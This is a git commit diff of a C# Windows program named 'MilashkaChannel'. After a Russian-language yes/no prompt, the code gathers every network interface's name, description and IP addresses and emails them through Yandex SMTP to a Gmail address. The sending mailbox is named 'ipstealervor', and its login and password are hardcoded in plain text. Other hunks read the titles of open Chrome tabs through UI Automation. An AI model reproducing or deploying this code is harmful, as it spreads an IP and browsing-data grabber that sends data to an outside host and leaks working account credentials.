82d3da4f8304636c7555edc71806b6dc35917348
TRUS5 <trus888@gmail.com>
2019-12-10 07:36:45 +0300

    Changed ip grab + removed refundant code

--- Program.cs
+++ Program.cs
@@ -7,6 +7,7 @@ using System.Text;
 using System.Windows.Forms;
 using System.Net;
 using System.Net.Mail;
+using System.Net.NetworkInformation;
 
 namespace MilashkaChannel
 {
@@ -19,28 +20,32 @@ namespace MilashkaChannel
             DialogResult dialogResult2 = MessageBox.Show("Вы хотите отправить TRUS5 свой ip-адрес?", "", MessageBoxButtons.YesNo);
             if (dialogResult2 == DialogResult.Yes)
             {
-                string to = "ipstealervor@yandex.ru";
-                string from = "ipstealervor@yandex.ru";
                 var temptext = "";
-                String strHostName = string.Empty;
-                strHostName = Dns.GetHostName();
-                IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
-                IPAddress[] addr = ipEntry.AddressList;
-                for (int i = 0; i < addr.Length; i++)
+
+
+                foreach (NetworkInterface netInterface in NetworkInterface.GetAllNetworkInterfaces())
                 {
-                    temptext += addr[i].ToString() + "\n";
+                    temptext += "Name: " + netInterface.Name + "\n";
+                    temptext += "Description: " + netInterface.Description + "\n";
+                    temptext += "Addresses: \n";
+                    IPInterfaceProperties ipProps = netInterface.GetIPProperties();
+                    foreach (UnicastIPAddressInformation addr in ipProps.UnicastAddresses)
+                    {
+                        temptext += addr.Address.ToString() + "\n";
+                    }
                 }
+
                 MailMessage mail = new MailMessage();
-                mail.From = new MailAddress("ipstealervor@yandex.ru"); // Адрес отправителя
-                mail.To.Add(new MailAddress("trus888@gmail.com")); // Адрес получателя
+                mail.From = new MailAddress("ipstealervor@yandex.ru");
+                mail.To.Add(new MailAddress("trus888@gmail.com"));
                 mail.Subject = "KEK";
                 mail.Body = temptext;
 
                 SmtpClient client = new SmtpClient();
                 client.Host = "smtp.yandex.ru";
-                client.Port = 587; // Обратите внимание что порт 587
+                client.Port = 587;
                 client.EnableSsl = true;
-                client.Credentials = new NetworkCredential("ipstealervor@yandex.ru", "QQqq1122"); // Ваши логин и пароль
+                client.Credentials = new NetworkCredential("ipstealervor@yandex.ru", "QQqq1122");
                 client.Send(mail);
             }
             else if (dialogResult2 == DialogResult.No)
@@ -85,19 +90,15 @@ namespace MilashkaChannel
 
             foreach (Process proc in procsChrome)
             {
-                // the chrome process must have a window 
                 if (proc.MainWindowHandle == IntPtr.Zero)
                 {
                     continue;
                 }
-                // to find the tabs we first need to locate something reliable - the 'New Tab' button 
                 AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                 Condition condNewTab = new PropertyCondition(AutomationElement.NameProperty, "Новая вкладка");
                 AutomationElement elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
-                // get the tabstrip by getting the parent of the 'new tab' button 
                 TreeWalker treewalker = TreeWalker.ControlViewWalker;
                 AutomationElement elmTabStrip = treewalker.GetParent(elmNewTab);
-                // loop through all the tabs and get the names which is the page title 
                 Condition condTabItem = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
                 foreach (AutomationElement tabitem in elmTabStrip.FindAll(TreeScope.Children, condTabItem))
                 {
@@ -135,19 +136,15 @@ namespace MilashkaChannel
 
             foreach (Process proc in procsChrome)
             {
-                // the chrome process must have a window 
                 if (proc.MainWindowHandle == IntPtr.Zero)
                 {
                     continue;
                 }
-                // to find the tabs we first need to locate something reliable - the 'New Tab' button 
                 AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                 Condition condNewTab = new PropertyCondition(AutomationElement.NameProperty, "Новая вкладка");
                 AutomationElement elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
-                // get the tabstrip by getting the parent of the 'new tab' button 
                 TreeWalker treewalker = TreeWalker.ControlViewWalker;
                 AutomationElement elmTabStrip = treewalker.GetParent(elmNewTab);
-                // loop through all the tabs and get the names which is the page title 
                 Condition condTabItem = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
                 foreach (AutomationElement tabitem in elmTabStrip.FindAll(TreeScope.Children, condTabItem))
                 {
